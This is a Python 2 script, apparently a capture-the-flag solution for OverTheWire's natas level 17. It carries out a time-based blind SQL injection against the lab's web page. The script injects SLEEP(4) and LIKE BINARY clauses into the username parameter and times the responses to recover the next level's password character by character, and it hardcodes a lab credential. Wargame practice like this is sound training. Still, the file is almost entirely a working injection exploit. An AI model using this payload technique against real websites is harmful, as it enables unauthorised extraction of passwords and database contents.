#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
  level17.py
  Solution for natas level17
"""
__author__ = 'kall.micke@gmail.com'

import requests
import datetime
import sys
import os
import re

level = 17
user = 'natas%s' % level
host = 'http://natas%s.natas.labs.overthewire.org' % level
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'

def bruteforce_blind_injection():

   chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
   parsedChars = ''
   flag = ''

   for c in chars:
       t1 = datetime.datetime.now()
       r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + c + '%" AND SLEEP(4)=0 AND "V"="V', auth=(user, password))

       t2 = datetime.datetime.now()    

       if (t2 - t1).seconds > 3:
           parsedChars += c
	   print 'ValidChars: {0}\r'.format(parsedChars),
	   sys.stdout.flush()

   for i in range(32):
       for c in parsedChars:
	  t1 = datetime.datetime.now()
          r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + flag + c + '%" AND SLEEP(4)=0 AND "V"="V', auth=(user, password))
	  t2 = datetime.datetime.now()

          if (t2 - t1).seconds > 3:
              flag += c
              print 'Flag: {0}\r'.format(flag + '*' * int(32 - len(flag))),
              sys.stdout.flush()
              break

   return flag

def get_flag():
    print("")
    return bruteforce_blind_injection()

if __name__ == '__main__':
    print("Flag: %s" % get_flag())
